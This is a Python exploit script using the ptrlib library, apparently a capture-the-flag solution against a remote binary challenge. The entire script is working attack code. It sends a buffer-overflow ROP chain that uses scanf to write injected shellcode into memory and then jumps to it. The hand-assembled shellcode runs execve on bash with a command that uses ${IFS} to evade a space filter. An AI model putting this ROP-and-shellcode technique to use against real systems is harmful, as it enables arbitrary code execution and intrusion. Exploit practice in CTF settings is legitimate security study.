import os
from ptrlib import *

HOST = os.getenv('HOST', '153.120.170.218')
PORT = os.getenv('PORT', '9001')

rop_pop_rdi = 0x004007e3
rop_pop_rsi_r15 = 0x004007e1

addr_shellcode = 0x600800
addr_scanf = 0x4005c0
addr_ps = 0x40081b

#sock = process("../files/chall")
sock = remote(HOST, int(PORT))

shellcode = nasm(
    """
    xor edx, edx
    push rdx
    call arg2
    db "cat${IFS}flag*>&0", 0
arg2:
    call arg1
    db "-c", 0
arg1:
    call arg0
    db "/bin/bash", 0, 0, 0, 0, 0
arg0:
    pop rdi
    push rdi
    mov rsi, rsp
    mov eax, 59
    syscall  ; execve
    xor edi, edi
    mov eax, 60
    syscall  ; exit
    """,
    bits=64
)

sock.recvline()
payload  = b'A' * 0x28
payload += p64(rop_pop_rdi)
payload += p64(addr_ps)
payload += p64(rop_pop_rsi_r15)
payload += p64(addr_shellcode)
payload += p64(0xdeadbeef)
payload += p64(addr_scanf)
payload += p64(addr_shellcode)
assert not has_space(payload)
sock.sendline(payload)

assert not has_space(shellcode)
sock.sendline(shellcode)

sock.interactive()
